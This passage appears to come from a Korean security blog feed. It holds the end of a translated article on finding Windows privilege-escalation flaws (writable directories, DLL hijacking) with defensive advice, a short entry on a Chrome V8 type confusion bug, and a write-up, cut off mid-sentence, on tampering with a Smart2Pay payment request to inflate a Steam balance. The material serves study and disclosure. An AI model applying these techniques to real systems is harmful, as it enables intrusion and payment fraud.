&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5; &#xD30C;&#xC77C;&#xC740; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xCDE8;&#xC57D;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xB2E4;&#xC74C;&#xC740; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xC790;&#xB3D9; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC9C0;&#xC2DC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2E4;. &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xC870;&#xC791;&#xB41C; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xACE0; &#xC0AC;&#xC9C4;&#xC758; &#xACBD;&#xC6B0; <code>calc.exe</code>&#xB97C; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2013.png" alt="Untitled"></p><h3 id="&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC758;-&#xD558;&#xC704;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;-&#xC124;&#xCE58;"><a href="#&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC758;-&#xD558;&#xC704;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;-&#xC124;&#xCE58;" class="headerlink" title="&#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC124;&#xCE58;"></a>&#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC124;&#xCE58;</h3><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC758; &#xB2E4;&#xB978; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xBC30;&#xCE58;&#xD558;&#xB294; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xBCF4;&#xC548;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC801;&#xC808;&#xD55C; ACL&#xC744; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; Python 2.7&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>C:\python27\</code>&#xC5D0; &#xC124;&#xCE58;&#xB41C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2014.png" alt="Untitled"></p><p>&#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xAE30;&#xBCF8; ACL&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xC81C; &#xC774;&#xAC83;&#xC73C;&#xB85C; DLL hijacking &#xAE30;&#xC220;&#xC744; &#xC2DC;&#xB3C4;&#xD574; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2015.png" alt="Untitled"></p><p>&#xC774;&#xB294; &#xC5B4;&#xB835;&#xAC8C; &#xC0DD;&#xAC01;&#xD560; &#xD544;&#xC694;&#xB3C4; &#xC5C6;&#xB2E4;. &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; <code>C:\python27\</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xAC04;&#xB2E8;&#xD788; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2016.png" alt="Untitled"></p><h3 id="ACL-&#xC124;&#xC815;-&#xC5C6;&#xC774;-&#xC0AC;&#xC6A9;&#xC790;-&#xC9C0;&#xC815;-&#xC124;&#xCE58;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xD5C8;&#xC6A9;"><a href="#ACL-&#xC124;&#xC815;-&#xC5C6;&#xC774;-&#xC0AC;&#xC6A9;&#xC790;-&#xC9C0;&#xC815;-&#xC124;&#xCE58;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xD5C8;&#xC6A9;" class="headerlink" title="ACL &#xC124;&#xC815; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; &#xC124;&#xCE58; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD5C8;&#xC6A9;"></a>ACL &#xC124;&#xC815; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; &#xC124;&#xCE58; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD5C8;&#xC6A9;</h3><p>&#xB9CE;&#xC740; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; <code>C:\Program Files\</code>&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBCF4;&#xC548; ACL &#xC0C1;&#xC18D;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC548;&#xC804;&#xD558;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC790;&#xC2E0;&#xC758; &#xC124;&#xCE58; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC120;&#xD0DD;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB300;&#xC0C1; &#xC704;&#xCE58;&#xC5D0; ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xD14C;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB294; &#xB9E4;&#xC6B0; &#xB4DC;&#xBB3C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; Microsoft SQL Server 2019 &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2017.png" alt="Untitled"></p><blockquote><p>&#x201C;&#xACE0;&#xAE09;&#x201D; &#xB610;&#xB294; &#x201C;&#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815;&#x201D; &#xC124;&#xCE58;&#xB97C; &#xC218;&#xD589;&#xD560; &#xD544;&#xC694;&#xB3C4; &#xC5C6;&#xC774; &#xC124;&#xCE58; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p>&#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; ACL&#xC744; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2018.png" alt="Untitled"></p><blockquote><p>SQL Express 2019&#xAC00; &#xC124;&#xCE58;&#xB41C; &#xC704;&#xCE58;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2019.png" alt="Untitled"></p><p>Microsoft SQL Server 2019&#xC640; &#xAC19;&#xC774; &#xC124;&#xCE58;&#xD560; &#xC704;&#xCE58;&#xB97C; &#xC120;&#xD0DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; Windows &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC124;&#xCE58;&#xB41C; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB530;&#xB77C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC5D0; &#xCDE8;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;.</p><h1 id="&#xAD8C;&#xD55C;-&#xC0C1;&#xC2B9;-&#xCDE8;&#xC57D;&#xC810;-&#xBC29;&#xC5B4;"><a href="#&#xAD8C;&#xD55C;-&#xC0C1;&#xC2B9;-&#xCDE8;&#xC57D;&#xC810;-&#xBC29;&#xC5B4;" class="headerlink" title="&#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; &#xBC29;&#xC5B4;"></a>&#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; &#xBC29;&#xC5B4;</h1><h2 id="&#xAD8C;&#xD55C;-&#xC5C6;&#xB294;-&#xC0AC;&#xC6A9;&#xC790;&#xC758;-&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC5D0;&#xC11C;-&#x201C;&#xD3F4;&#xB354;-&#xB9CC;&#xB4E4;&#xAE30;&#x201D;-&#xAD8C;&#xD55C;-&#xC81C;&#xAC70;"><a href="#&#xAD8C;&#xD55C;-&#xC5C6;&#xB294;-&#xC0AC;&#xC6A9;&#xC790;&#xC758;-&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC5D0;&#xC11C;-&#x201C;&#xD3F4;&#xB354;-&#xB9CC;&#xB4E4;&#xAE30;&#x201D;-&#xAD8C;&#xD55C;-&#xC81C;&#xAC70;" class="headerlink" title="&#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC5D0;&#xC11C; &#x201C;&#xD3F4;&#xB354; &#xB9CC;&#xB4E4;&#xAE30;&#x201D; &#xAD8C;&#xD55C; &#xC81C;&#xAC70;"></a>&#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC5D0;&#xC11C; &#x201C;&#xD3F4;&#xB354; &#xB9CC;&#xB4E4;&#xAE30;&#x201D; &#xAD8C;&#xD55C; &#xC81C;&#xAC70;</h2><p>&#xC704;&#xC5D0; &#xC124;&#xBA85;&#xB41C; &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xAC00;&#xC7A5; &#xAC04;&#xB2E8;&#xD55C; &#xBC29;&#xC5B4;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xD3F4;&#xB354;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2020.png" alt="Untitled"></p><h2 id="C-Program-Files-&#xC678;&#xBD80;&#xC5D0;-&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;-&#xC124;&#xCE58;&#xD558;&#xC9C0;-&#xC54A;&#xAE30;"><a href="#C-Program-Files-&#xC678;&#xBD80;&#xC5D0;-&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;-&#xC124;&#xCE58;&#xD558;&#xC9C0;-&#xC54A;&#xAE30;" class="headerlink" title="C:\Program Files\ &#xC678;&#xBD80;&#xC5D0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC124;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xAE30;"></a>C:\Program Files\ &#xC678;&#xBD80;&#xC5D0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC124;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xAE30;</h2><p>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; <code>C:\Program Files\</code> &#xB610;&#xB294; <code>C:\Program Files (x86)\</code> &#xC774;&#xC678;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xC124;&#xCE58;&#xB41C; &#xACBD;&#xC6B0;  ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC548;&#xC804;&#xD558;&#xB2E4;. &#xAD8C;&#xC7A5;&#xB418;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC704;&#xCE58;&#xC5D0;&#xB9CC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD53C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="&#xC2DC;&#xC2A4;&#xD15C;-&#xD14C;&#xC2A4;&#xD2B8;-&#xBC0F;-&#xAC15;&#xD654;"><a href="#&#xC2DC;&#xC2A4;&#xD15C;-&#xD14C;&#xC2A4;&#xD2B8;-&#xBC0F;-&#xAC15;&#xD654;" class="headerlink" title="&#xC2DC;&#xC2A4;&#xD15C; &#xD14C;&#xC2A4;&#xD2B8; &#xBC0F; &#xAC15;&#xD654;"></a>&#xC2DC;&#xC2A4;&#xD15C; &#xD14C;&#xC2A4;&#xD2B8; &#xBC0F; &#xAC15;&#xD654;</h2><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130; &#xBC0F; &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC131;&#xC5D0; &#xB300;&#xD574; &#xC790;&#xCCB4; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB41C; &#xD30C;&#xC77C; &#xC704;&#xCE58;&#xC758; &#xACBD;&#xC6B0; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xC704;&#xCE58;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC7A0;&#xAE00; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xBC1C;&#xACAC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xACF5;&#xAE09;&#xC5C5;&#xCCB4;&#xC5D0; &#xC5F0;&#xB77D;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC54C;&#xB9AC;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xB2E4;. &#xACF5;&#xAE09;&#xC5C5;&#xCCB4;&#xC640;&#xC758; &#xCEE4;&#xBBA4;&#xB2C8;&#xCF00;&#xC774;&#xC158;&#xC758; &#xACBD;&#xC6B0; CERT/CC&#xAC00; &#xC9C0;&#xC6D0;&#xC744; &#xC81C;&#xACF5; &#xD560; &#xC218; &#xC788;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>vulnerability</tag>
      
      <tag>translation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30517: Chrome V8 엔진의 Type Confusion 취약점</title>
    <link href="/2021/08/17/l0ch/2021-08-17/"/>
    <url>/2021/08/17/l0ch/2021-08-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1203122">Issue 1203122: Security: Type confusion bug in LoadSuperIC</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome V8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Chrome V8&#xC5D4;&#xC9C4;&#xC758; <a href="https://mathiasbynens.be/notes/shapes-ics">&#xC778;&#xB77C;&#xC778; &#xCE90;&#xC2DC;(IC)</a> &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; type confusion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>AccessorAssembler::LoadSuperIC</code>&#xC640; <code>AccessorAssembler::HandleLoadICHandlerCase</code> &#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AccessorAssembler::LoadSuperIC</span><span class="hljs-params">(<span class="hljs-keyword">const</span> LoadICParameters* p)</span> </span>{...BIND(&amp;non_inlined);  {    <span class="hljs-comment">// LoadIC_Noninlined can be used here, since it handles the</span>    <span class="hljs-comment">// lookup_start_object != receiver case gracefully.</span>    LoadIC_Noninlined(p, lookup_start_object_map, strong_feedback, &amp;var_handler,                      &amp;if_handler, &amp;miss, &amp;direct_exit);  }...}</code></pre><p><code>LoadSuperIC</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>LoadIC_Noninlined</code>&#xB294; <code>lookup_start_object != receiver</code> &#xC758; &#xACBD;&#xC6B0;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AccessorAssembler::HandleLoadICHandlerCase</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">...</span></span><span class="hljs-function"><span class="hljs-params">  BIND(&amp;call_handler); &lt;------- [<span class="hljs-number">6</span>]</span></span><span class="hljs-function"><span class="hljs-params">  {</span></span><span class="hljs-function"><span class="hljs-params">    exit_point-&gt;ReturnCallStub(LoadWithVectorDescriptor{}, CAST(handler),</span></span><span class="hljs-function"><span class="hljs-params">                               p-&gt;context(), p-&gt;receiver(), p-&gt;name(),</span></span><span class="hljs-function"><span class="hljs-params">                               p-&gt;slot(), p-&gt;<span class="hljs-built_in">vector</span>());</span></span><span class="hljs-function"><span class="hljs-params">  }</span></span><span class="hljs-function"><span class="hljs-params">}</span></span></code></pre><p>&#xADF8;&#xB7EC;&#xB098; <code>HandleLoadICHandlerCase</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>lookup_start_object != receiver</code>&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>p&#x2192;lookup_start_object()</code> &#xB300;&#xC2E0; <code>p&#x2192;receiver()</code>&#xB97C; &#xC804;&#xB2EC;&#xD574; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; type confusion&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xAC00; Object&#xB97C; StringWrapper&#xB85C; type confusion&#xD574; &#xAC1D;&#xCCB4;&#xC758; &#xC694;&#xC18C; &#xC8FC;&#xC18C;&#xB97C; leak&#xD558;&#xAC70;&#xB098; &#xBC30;&#xC5F4;&#xC744; &#xD568;&#xC218;&#xB85C; &#xC0DD;&#xAC01;&#xD558;&#xAC8C;&#xB054; &#xAC1D;&#xCCB4;&#xB97C; &#xC18D;&#xC5EC; arbitrary read/write primitive&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>v8</tag>
      
      <tag>type confusion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Smart2Pay in-flight 데이터 수정으로 Steam 잔액 충전</title>
    <link href="/2021/08/16/fabu1ous/2021-08-16/"/>
    <url>/2021/08/16/fabu1ous/2021-08-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1295844">Modify in-flight data to payment provider Smart2Pay</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Smart2Pay</p><p>Steam</p><p>Valve</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xAC8C;&#xC784; &#xC720;&#xD1B5; &#xD50C;&#xB7AB;&#xD3FC; Steam&#xC758; Smart2Pay&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xACB0;&#xC81C; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Smart2Pay&#xB97C; &#xD1B5;&#xD574; Steam &#xC794;&#xC561; &#xCDA9;&#xC804; &#xC2DC; <code>https://globalapi.smart2pay.com/</code>&#xB85C; &#xBCF4;&#xB0B4;&#xC9C0;&#xB294; POST &#xB9AC;&#xD018;&#xC2A4;&#xD2B8;&#xB97C; &#xC870;&#xC791;&#xD574; &#xC2E4;&#xC81C; &#xC9C0;&#xBD88; &#xAE08;&#xC561;&#xBCF4;&#xB2E4; &#xB354; &#xB9CE;&#xC740; &#xC794;&#xC561;&#xC744; &#xCDA9;&#xC804;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: globalapi.smart<span class="hljs-number">2</span>pay.com<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">388</span><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><span class="hljs-attribute">Sec</span>-Ch-Ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;92&quot;</span>, <span class="hljs-string">&quot; Not A;Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;92&quot;</span><span class="hljs-attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Origin</span>: https://store.steampowered.com<span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">92</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4515</span>.<span class="hljs-number">131</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><span class="hljs-attribute">Sec</span>-Fetch-Site: cross-site<span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<span class="hljs-attribute">Referer</span>: https://store.steampowered.com/<span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Accept</span>-Language: pl-PL,pl;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">MerchantID</span>=<span class="hljs-number">1102</span>&amp;MerchantTransactionID=&#x2588;&#x2588;&#x2588;&amp;Amount=<span class="hljs-number">2000</span>&amp;Currency=PLN&amp;ReturnURL=https%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fstore.steampowered.com%<span class="hljs-number">2</span>Fpaypal%<span class="hljs-number">2</span>Fsmart<span class="hljs-number">2</span>pay%<span class="hljs-number">2</span>F&#x2588;&#x2588;&#x2588;&#x2588;%<span class="hljs-number">2</span>F&amp;MethodID=<span class="hljs-number">12</span>&amp;Country=PL&amp;CustomerEmail=brixamount<span class="hljs-number">100</span>abc%<span class="hljs-number">40</span>&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&#x2588;&amp;CustomerName=_drbrix_&amp;SkipHPP=<span class="hljs-number">1</span>&amp;Description=Steam+Purchase&amp;SkinID=<span class="hljs-number">101</span>&amp;Hash=&#x2588;&#x2588;&#x2588;</code></pre><p>POST &#xB9AC;&#xD018;&#xC2A4;&#xD2B8;&#xC758; Hash&#xAC12;&#xC740; &#x2018;=&#x2019;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xBAA8;&#xB4E0; &#xD544;&#xB4DC;&#xC758; &#xC774;&#xB984;&#xACFC; &#xAC12;&#xC744; &#xD558;&#xB098;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xD569;&#xCCD0;&#xC11C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574;  <code>amount</code>&#xC640;  <code>CustomerEmail</code> &#xD544;&#xB4DC;&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; 